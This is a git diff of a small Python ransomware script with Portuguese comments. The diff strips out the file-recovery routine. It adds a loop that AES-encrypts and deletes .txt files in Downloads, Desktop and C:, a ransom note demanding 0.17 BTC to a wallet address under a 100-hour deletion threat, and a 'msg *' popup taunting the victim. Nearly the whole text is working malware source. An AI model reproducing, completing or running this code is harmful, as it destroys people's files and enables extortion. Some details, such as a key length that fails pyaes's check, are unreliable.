@@ -10,21 +10,21 @@ import glob
 import time
 import pyaes
 from pathlib import Path
-
+#a=argv[1]
 lst_arq = ["*.txt"]
+lst_past = ["Downloads","Desktop","C:"]
+
 
 print('Criptografando')
 time.sleep(3)
 
-# Entra no Desktop e faz a verificação
-try:
-    desktop = Path.home() / "Downloads"
-    #download = Path.home() / "Downloads"
-except Exception:
-    pass
-
-os.chdir(desktop)
-#os.chdir(download)
+def txt():
+    msg=open(f'{y}\\LEIA.txt','w+')
+    msg.writelines("YOU HAVE BEEN INFECTED BY ENTERING SITES ABOBINABLE BY OUR LEGION.\nAND NOW SUFFERING THE CONSEQUENCES.\n")
+    msg.writelines("ALL YOUR FILES HAVE BEEN ENCRYPTED. \nAND IN 100 HRS THEY WILL BE DELETED.")
+    msg.writelines("SO THAT DOES NOT HAPPEN SEND 0.17BTC TO OUR WALLET: 1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX.")
+    msg.writelines("\n\nWE ARE ANONYMOUS.\nWE ARE LEGION.\nWE DO NOT FORGIVE\nWE DO NOT FORGET.\nEXPECT US")
+    msg.close()
 
 def criptografando():
     for files in lst_arq:
@@ -35,7 +35,7 @@ def criptografando():
             f.close()
 
             os.remove(f'{desktop}\\{format_file}')
-            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
+            key = b"102efd86a2bec382e7945002e53505a7"  # 16 byts key - chave
             aes = pyaes.AESModeOfOperationCTR(key)
             crypto_data = aes.encrypt(file_data)
 
@@ -46,35 +46,17 @@ def criptografando():
             new_file.write(crypto_data)
             new_file.close()
 
-
-def descrypt(decrypt_file):
+for i in lst_past:
     try:
-        for file in glob.glob('*.ransomcrypter'):
-
-            keybytes = decrypt_file.encode()
-            name_file = open(file, 'rb')
-            file_data = name_file.read()
-            dkey = keybytes  # 16 bytes key - change for your key
-            daes = pyaes.AESModeOfOperationCTR(dkey)
-            decrypt_data = daes.decrypt(file_data)
-
-            format_file = file.split('.')
-            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file
-
-            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
-            dnew_file.write(decrypt_data)
-            dnew_file.close()
-    except ValueError as err:
-        print('Chave inválida')
-
-
-if __name__ == '__main__':
+        desktop = Path.home() / i
+    except Exception:
+        pass
+    os.chdir(desktop)
     criptografando()
-    if criptografando:
-        key = input('Seu PC foi criptografado informe a chave  para liberar os arquivos:')
-        if key == '1ab2c3e4f5g6h7i8':
-            descrypt(key)
-            for del_file in glob.glob('*.ransomcrypter'):
-                os.remove(f'{desktop}\\{del_file}')
-        else:
-            print('Chave de liberação inválida!!!')
+y = Path.home() / "Desktop"
+os.chdir(y)
+txt()
+h=9
+while h<10:
+    os.system('msg * YOU HAVE BEEN INFECTED BY CORONADARK. WE LEAVE A FILE ON THE WORK AREA FOR YOU KAKAKAKA.')
+    h=h+1
